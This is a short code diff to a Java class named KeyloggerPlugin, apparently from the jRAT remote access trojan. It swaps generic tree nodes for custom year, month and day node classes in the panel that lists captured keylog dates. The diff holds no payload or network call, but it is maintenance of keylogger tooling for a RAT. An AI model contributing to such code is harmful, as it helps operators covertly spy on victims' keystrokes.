@@ -18,7 +18,10 @@ import pro.jrat.api.events.OnDisconnectEvent;
 import pro.jrat.api.events.OnEnableEvent;
 import pro.jrat.api.events.OnPacketEvent;
 import pro.jrat.api.events.OnSendPacketEvent;
+import pro.jrat.plugin.client.ui.DayTreeNode;
+import pro.jrat.plugin.client.ui.MonthTreeNode;
 import pro.jrat.plugin.client.ui.PanelKeylogger;
+import pro.jrat.plugin.client.ui.YearTreeNode;
 
 public class KeyloggerPlugin extends RATPlugin {
 
@@ -84,19 +87,19 @@ public class KeyloggerPlugin extends RATPlugin {
 			int years = dis.readInt();
 			
 			for (int i = 0; i < years; i++) {
-				DefaultMutableTreeNode year = new DefaultMutableTreeNode(dis.readUTF());
+				DefaultMutableTreeNode year = new YearTreeNode(dis.readUTF());
 				panel.getRoot().insert(year, 0);
 				
 				int months = dis.readInt();
 				
 				for (int l = 0; l < months; l++) {
-					DefaultMutableTreeNode month = new DefaultMutableTreeNode(dis.readUTF());
+					DefaultMutableTreeNode month = new MonthTreeNode(dis.readUTF());
 
 					year.insert(month, 0);
 					
 					int days = dis.readInt();
 					for (int m = 0; m < days; m++) {
-						DefaultMutableTreeNode day = new DefaultMutableTreeNode(dis.readUTF());
+						DefaultMutableTreeNode day = new DayTreeNode(dis.readUTF());
 
 						month.insert(day, 0);
 					}
